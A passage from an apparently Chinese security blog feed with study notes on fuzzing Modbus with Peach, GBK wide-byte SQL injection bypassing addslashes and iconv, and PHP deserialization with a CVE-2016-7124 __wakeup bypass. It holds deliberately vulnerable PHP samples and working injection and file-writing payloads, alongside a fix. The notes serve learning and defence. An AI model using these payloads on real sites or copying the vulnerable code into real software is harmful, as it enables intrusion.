<li>Host — Hostname or IP address</li>
<li>Timeout — Timeout in milliseconds (optional, defaults to 1,000)</li>
<li>Data — Data to send in ping packet (optional)</li>
<li>FaultOnSuccess — Fault if ping is successful (optional, defaults to false)</li>
</ul>
<p>Examples<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Agent name=&quot;Local&quot;&gt;</div><div class="line">        &lt;Monitor class=&quot;Ping&quot;&gt;</div><div class="line">                &lt;Param name=&quot;Host&quot; value=&quot;www.google.com&quot; /&gt;</div><div class="line">        &lt;/Monitor&gt;</div><div class="line">&lt;/Agent&gt;</div></pre></td></tr></table></figure></p>
<h4 id="Socket-Monitor"><a href="#Socket-Monitor" class="headerlink" title="Socket Monitor"></a>Socket Monitor</h4><p>Parameters</p>
<ul>
<li>Host — IP address of remote host (optional, defaults to “”)</li>
<li>Interface — IP address of interface to listen on (optional, defaults to 0.0.0.0)</li>
<li>Port — Port to listen on (optional, defaults to 8080)</li>
<li>Protocol — Protocol type to listen for (optional, defaults to tcp)</li>
<li>Timeout — Length of time to wait for incoming connection (optional, defaults to 1000 ms)</li>
<li>FaultOnSuccess — Fault if no conection is recorded (optional, defaults to false)</li>
</ul>
<p>Examples<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Agent name=&quot;Local&quot;&gt;</div><div class="line">        &lt;Monitor class=&quot;Socket&quot;&gt;</div><div class="line">                &lt;Param name=&quot;Port&quot; value=&quot;53&quot; /&gt;</div><div class="line">        &lt;/Monitor&gt;</div><div class="line">&lt;/Agent&gt;</div></pre></td></tr></table></figure></p>
<p>由官方文档最终得到如下Agent<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;Agent name=&quot;Local&quot;&gt;</div><div class="line">       &lt;Monitor class=&quot;Socket&quot;&gt;</div><div class="line">			&lt;Param name=&quot;Host&quot; value=&quot;192.168.1.100&quot; /&gt;</div><div class="line">			&lt;Param name=&quot;Port&quot; value=&quot;502&quot; /&gt;</div><div class="line">       &lt;/Monitor&gt;</div><div class="line">&lt;/Agent&gt;</div></pre></td></tr></table></figure></p>
<p>在TEST模块里引用Agent模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;Test name=&quot;Default&quot;&gt;</div><div class="line">	&lt;StateModel ref=&quot;ModbusStateModel&quot; /&gt;</div><div class="line">	</div><div class="line">	&lt;Agent ref=&quot;Local&quot; /&gt;</div><div class="line">	</div><div class="line">	&lt;Logger class=&quot;File&quot;&gt;</div><div class="line">		&lt;Param name=&quot;Path&quot; value=&quot;c:\log1&quot;/&gt;</div><div class="line">	&lt;/Logger&gt;</div><div class="line">	&lt;Publisher class=&quot;tcp.Tcp&quot;&gt;</div><div class="line">		&lt;Param name=&quot;Host&quot; value=&quot;192.168.1.100&quot;/&gt;</div><div class="line">		&lt;Param name=&quot;Port&quot; value=&quot;502&quot;/&gt;</div><div class="line">	&lt;/Publisher&gt;</div><div class="line">&lt;/Test&gt;</div></pre></td></tr></table></figure></p>
<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><p>先简单的说明下这个Pit的基本原理就是给工控设备发送合法的功能码，然后对数据部分进行变异。在这个过程用监听器监听，如果出现崩溃就会出现崩溃日志。这个过程是很漫长的过程，经过我跟Modbus Peach Fuzz的前辈进行的交流，得知他们的模糊测试点都是经过逆向找到的，所以Pit是不能发给我的。而我们这边目前只能对功能码进行模糊测试。据我了解对Modbus协议的模糊测试，需要先提取固件，然后对固件逆向分析，找到模糊测试的点，国内做的很少。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz5.png" alt=""></p>
<h2 id="Github-Link"><a href="#Github-Link" class="headerlink" title="Github Link"></a>Github Link</h2><p><a href="https://github.com/uknowsec/ModbusPeachPit" target="_blank" rel="external">Modbus Peach Pit</a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/jseidl/peach-pit" target="_blank" rel="external">Github Peach Fuzzer PIT Files</a><br><a href="http://community.peachfuzzer.com/v3/PeachPit.html" target="_blank" rel="external">PeachPit官方文档</a><br><a href="http://blog.nsfocus.net/peach-fuzz/" target="_blank" rel="external">浅析Peach Fuzz</a><br><a href="http://www.freebuf.com/articles/security-management/88249.html" target="_blank" rel="external">工控网络协议模糊测试：用peach对modbus协议进行模糊测试</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>宽字节注入漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/宽字节注入漏洞的利用与学习.html</id>
    <published>2017-08-01T01:30:37.000Z</published>
    <updated>2017-08-01T04:43:01.067Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="字符、字符集与字符序"><a href="#字符、字符集与字符序" class="headerlink" title="字符、字符集与字符序"></a>字符、字符集与字符序</h3><p>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
<p>字符序(collation)指同一字符集内字符间的比较规则。</p>
<h3 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。</p>
<h3 id="GBK编码取值范围"><a href="#GBK编码取值范围" class="headerlink" title="GBK编码取值范围"></a>GBK编码取值范围</h3><p>GBK采用双字节表示，总体编码范围为8140-FEFE，首字节在81-FE 之间，尾字节在40-FE 之间</p>
<h3 id="GB2313编码取值范围"><a href="#GB2313编码取值范围" class="headerlink" title="GB2313编码取值范围"></a>GB2313编码取值范围</h3><p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE</p>
<h3 id="MYSQL的字符集转换过程"><a href="#MYSQL的字符集转换过程" class="headerlink" title="MYSQL的字符集转换过程"></a>MYSQL的字符集转换过程</h3><ol>
<li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;</p>
</li>
<li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p>
</li>
</ol>
<ul>
<li>使用每个数据字段的CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);</li>
<li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用character_set_server设定值。</li>
</ul>
<p>将操作结果从内部操作字符集转换为character_set_results。</p>
<p>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</p>
<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addslashes(string)</div></pre></td></tr></table></figure>
<h4 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<h3 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">\x00</div><div class="line">\n</div><div class="line">\r</div><div class="line">\</div><div class="line">&apos;</div><div class="line">&quot;</div><div class="line">\x1a</div><div class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</div></pre></td></tr></table></figure>
<h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_real_escape_string(string,connection)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
<tr>
<td>connection</td>
<td style="text-align:center">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
</tr>
</tbody>
</table>
<h3 id="incov"><a href="#incov" class="headerlink" title="incov()"></a>incov()</h3><p>(PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)<br>iconv — 字符串按要求的字符编码来转换</p>
<h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string iconv ( string $in_charset , string $out_charset , string $str )</div></pre></td></tr></table></figure>
<p>将字符串 str 从 in_charset 转换编码到 out_charset。</p>
<h4 id="参数说明：-2"><a href="#参数说明：-2" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>in_charset</td>
<td style="text-align:center">输入的字符集。</td>
</tr>
<tr>
<td>out_charset</td>
<td style="text-align:center">输出的字符集。</td>
</tr>
<tr>
<td>str</td>
<td style="text-align:center">要转换的字符串。</td>
</tr>
</tbody>
</table>
<h3 id="相关字符集设置"><a href="#相关字符集设置" class="headerlink" title="相关字符集设置"></a>相关字符集设置</h3><ul>
<li>character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。</li>
<li>character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。</li>
<li>character_set_database:数据库缺省编码字符集。</li>
<li>character_set_filesystem:文件系统编码字符集。</li>
<li>character_set_results:SQL语句执行结果编码字符集。</li>
<li>character_set_server:服务器缺省编码字符集。</li>
<li>character_set_system:系统缺省编码字符集。</li>
<li>character_sets_dir:字符集存放目录，一般不要修改</li>
</ul>
<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>　　GBK 占用两字节</p>
<p>　　ASCII占用一字节</p>
<p>　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。</p>
<p>　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</p>
<p>　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\’” ，“\”既URL里的“%5C”，那么也就是说，“%DF’”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</p>
<h2 id="MySQL中的宽字节注入"><a href="#MySQL中的宽字节注入" class="headerlink" title="MySQL中的宽字节注入"></a>MySQL中的宽字节注入</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//连接数据库部分，注意使用了gbk编码</div><div class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;uknow&apos;) or die(&apos;bad!&apos;);</div><div class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</div><div class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</div><div class="line">//执行sql语句</div><div class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</div><div class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</div><div class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</div><div class="line">mysql_free_result($result);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>SQL语句是SELECT * FROM news WHERE tid=’{$id}’，就是根据文章的id把文章从news表中取出来。</p>
<p>在这个sql语句前面，使用了一个addslashes函数，将$id的值转义。这是通常cms中对sql注入进行的操作，只要输入参数在单引号中，就逃逸不出单引号的限制，无法注入，</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql1.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/sql2.png" alt=""></p>
<p>一般绕过addslashes的方式就是，想办法处理\’前面的\：</p>
<ul>
<li>1.想办法给\前面再加一个\（或单数个即可），变成\’，这样\被转义了，’逃出了限制</li>
<li>2.想办法把\弄没有。<br>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。如果输入%df’看会怎样：</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql3.png" alt=""><br>其中的�\是一个汉字  我们可以改成其他的。根据gbk编码，第一个字节ascii码大于128，基本上就可以了。比如我们不用%df，用%dd也可以：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql4.png" alt=""></p>
<p>为什么从刚才到现在，只是在’也就是%27前面加了一个%df就报错了？而且从图中可以看到，报错的原因就是多了一个单引号，而单引号前面的反斜杠不见了。</p>
<p>这就是mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“輁”，而’逃逸了出来。</p>
<p>因为两个字节代表一个汉字，所以我们可以试试%df%df%27：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql5.png" alt=""></p>
<p>不报错了。因为%df%df是一个汉字，%5c%27不是汉字，仍然是\’。</p>
<p>我们可以利用宽字节注入的特点进行手注，也可以在url后面加上%df’丢给sqlmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/1/0x01/index.php?id=1%df&apos;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql6.png" alt=""></p>
<h2 id="GB2312与GBK的不同"><a href="#GB2312与GBK的不同" class="headerlink" title="GB2312与GBK的不同"></a>GB2312与GBK的不同</h2><p>GB2312也是属于宽字节，那么使用GB2312连接数据库，看能否进行宽字节注入</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql7.png" alt=""></p>
<p>结果就是不能注入了：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql8.png" alt=""></p>
<p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。</p>
<h2 id="宽字符注入的修复"><a href="#宽字符注入的修复" class="headerlink" title="宽字符注入的修复"></a>宽字符注入的修复</h2><ul>
<li>将character_set_client设置为binary（二进制）<br>只需在所有sql语句前指定一下连接的形式是二进制：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</div></pre></td></tr></table></figure>
</li>
</ul>
<p>当mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p>
<p>然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p>
<p>所以，将character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql10.png" alt=""></p>
<p>已经不能注入了<br><img src="http://obr4sfdq7.bkt.clouddn.com/sql9.png" alt=""></p>
<h2 id="inconv导致的致命后果"><a href="#inconv导致的致命后果" class="headerlink" title="inconv导致的致命后果"></a>inconv导致的致命后果</h2><h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//连接数据库部分，注意使用了gbk编码</div><div class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;toor!@#$&apos;) or die(&apos;bad!&apos;);</div><div class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</div><div class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</div><div class="line">//执行sql语句</div><div class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </div><div class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</div><div class="line">$id = iconv(&apos;utf-8&apos;, &apos;gbk&apos;, $id);</div><div class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</div><div class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</div><div class="line">mysql_free_result($result);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>可以看到，它在sql语句执行前，将character_set_client设置成了binary，所以可以避免宽字符注入的问题。但之后其调用了iconv将已经过滤过的参数$id给转换了一下。</p>
<p>给id参数一个值：錦’<br><img src="http://obr4sfdq7.bkt.clouddn.com/sql11.png" alt=""></p>
<p>报错了。说明可以注入。</p>
<p>“錦“这个字，它的utf-8编码是0xe98ca6，它的gbk编码是0xe55c。<br>\的ascii码正是5c。那么，当我们的錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。</p>
<p>正利用了绕过addslashes的两种方式的第一种：将\转义掉。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">浅析白盒审计中的字符编码及SQL注入</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>反序列化漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/反序列化漏洞的利用与学习.html</id>
    <published>2017-07-28T01:39:51.000Z</published>
    <updated>2017-08-02T01:14:33.225Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;PHP反序列化&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">class A&#123;</div><div class="line">	var $a = &quot;test&quot;;</div><div class="line">	function __destruct()&#123;</div><div class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</div><div class="line">		fputs($fp,$this-&gt;a);</div><div class="line">		fclose($fp);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">$test = $_POST[&apos;test&apos;];</div><div class="line">$test_unser = unserialize($test);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>上述代码使用了php的magic方法destruct（详情参考<a href="http://php.net/manual/en/language.oop5.magic.php" target="_blank" rel="external">PHP: Magic Methods</a>），而destruct是当一个对象被销毁时被自动调用的析构方法。<br>然后unserialize中参数可控，这样我们就可以构造一个序列化的对象A来控制其中的变量a的值，最终会产生漏洞。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构造一个序列化的对象A并给其中变量a赋值为&lt;?php phpinfo();?&gt;如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test=O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/php1.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/php2.png" alt=""><br>如上成功将&lt;?php phpinfo();?&gt;写入1.php.</p>
<h3 id="实例利用"><a href="#实例利用" class="headerlink" title="实例利用"></a>实例利用</h3><h4 id="基础准备"><a href="#基础准备" class="headerlink" title="基础准备"></a>基础准备</h4><p>PHP之前爆出了一个漏洞（<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="external">CVE-2016-7124</a> ），简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。Demo如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;PHP&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">class A&#123;</div><div class="line">	var $a = &quot;test&quot;;</div><div class="line">	function __destruct()&#123;</div><div class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</div><div class="line">		fputs($fp,$this-&gt;a);</div><div class="line">		fclose($fp);</div><div class="line">	&#125;</div><div class="line">	function __wakeup()</div><div class="line">    	&#123;</div><div class="line">        	foreach(get_object_vars($this) as $k =&gt; $v) &#123;</div><div class="line">            		$this-&gt;$k = null;</div><div class="line">        	&#125;</div><div class="line">        	echo &quot;Waking up...\n&quot;;</div><div class="line">    	&#125;</div><div class="line">&#125;</div><div class="line">$test = $_POST[&apos;test&apos;];</div><div class="line">$test_unser = unserialize($test);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>我们再次使用之前的payload测试，结果如下：<br><img src="http://obr4sfdq7.bkt.clouddn.com/php3.png" alt=""><br>发现__wakeup函数成功执行，清除了对象属性，从而1.php内容也为空了。</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>根据CVE-2016-7124的原理，将上面payload中A的个数变成2或者大于2的数字如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test=O:1:”A”:2:&#123;s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;&#125;</div></pre></td></tr></table></figure></p>
<p>然后再次执行发现绕过了__wakeup函数，成功将phpinfo()写入1.php<br><img src="http://obr4sfdq7.bkt.clouddn.com/php4.png" alt=""></p>
<h4 id="SugarCRM-v6-5-23-PHP反序列化"><a href="#SugarCRM-v6-5-23-PHP反序列化" class="headerlink" title="SugarCRM v6.5.23 PHP反序列化"></a>SugarCRM v6.5.23 PHP反序列化</h4><p>漏洞分析：<a href="http://paper.seebug.org/39/" target="_blank" rel="external">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br>漏洞环境：<a href="https://github.com/sugarcrm/sugarcrm_dev/tree/6.5.23/" target="_blank" rel="external">SugarCRM v6.5.23</a></p>
